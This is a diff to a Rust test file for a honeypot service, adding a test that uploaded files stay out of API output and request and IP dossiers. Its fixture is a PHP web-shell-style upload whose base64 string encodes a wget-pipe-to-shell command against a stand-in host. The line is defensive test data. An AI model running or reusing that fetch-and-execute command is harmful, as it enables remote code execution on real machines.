@@ -1,6 +1,8 @@
 //! Dropped files are never served (MIK-121 §5.1): whatever the trap
 //! answers, at a file's answered path or anywhere else, carries none of
-//! the bytes it kept. And no code but the upload store reads them.
+//! the bytes it kept. And no code but the upload store reads them. Text
+//! uploads are parsed and shown escaped on admin pages only; the API and
+//! the dossiers stay metadata-only. Binaries are never parsed.
 use peephole::config::Config;
 use peephole::store::Store;
 use peephole::trap::{self, TrapState};
@@ -175,6 +177,60 @@ async fn no_trap_response_carries_a_dropped_file() {
             "a trap answer carries a dropped file:\n{a}"
         );
     }
+}
+
+/// The dossiers of a request that carried an upload and of its sender hold
+/// no byte of the file: the admin pages parse text uploads, nothing else
+/// does. (The API's own pages are checked in `admin::api_v1`.)
+#[tokio::test]
+async fn api_and_dossier_carry_no_upload_text() {
+    let (base, store, dir) = spawn().await;
+    let marker = format!("MARK{}", uuid::Uuid::new_v4().simple());
+    let text = format!(
+        "<?php /* {marker} */ system(base64_decode('d2dldCBodHRwOi8vMTkyLjAuMi45L3guc2ggLU8tIHwgc2g='));"
+    );
+    let a = send(
+        &base,
+        "PUT",
+        "/x/a.php",
+        "203.0.113.70",
+        None,
+        text.clone().into_bytes(),
+    )
+    .await;
+    assert!(!a.contains(&marker));
+    let (id, uid): (i64, String) = sqlx::query_as(
+        "SELECT r.id, u.uid FROM uploads u JOIN requests r ON r.uid = u.request_uid",
+    )
+    .fetch_one(&store.pool)
+    .await
+    .unwrap();
+    let cfg = Config::load(&dir.path().join("c.toml")).unwrap();
+    let state = peephole::admin::AdminState::public_only(store.clone(), cfg);
+    let request = peephole::admin::dossier::request(&state, &id.to_string())
+        .await
+        .unwrap()
+        .unwrap();
+    let ip = peephole::admin::dossier::ip(&state, "203.0.113.70")
+        .await
+        .unwrap()
+        .unwrap();
+    for (what, json) in [
+        ("request", serde_json::to_string(&request).unwrap()),
+        ("ip", serde_json::to_string(&ip).unwrap()),
+    ] {
+        assert!(!json.contains(&marker), "{what} dossier: {json}");
+    }
+    let mut conn = store.read.acquire().await.unwrap();
+    let row = peephole::store::uploads::get(&mut conn, &uid)
+        .await
+        .unwrap()
+        .unwrap();
+    // The only reader, and only for text.
+    let got = peephole::store::uploads::text_for_xray(&mut conn, &row)
+        .await
+        .unwrap();
+    assert_eq!(got.as_deref(), Some(text.as_bytes()));
 }
 
 /// Every file under `dir`, recursively.
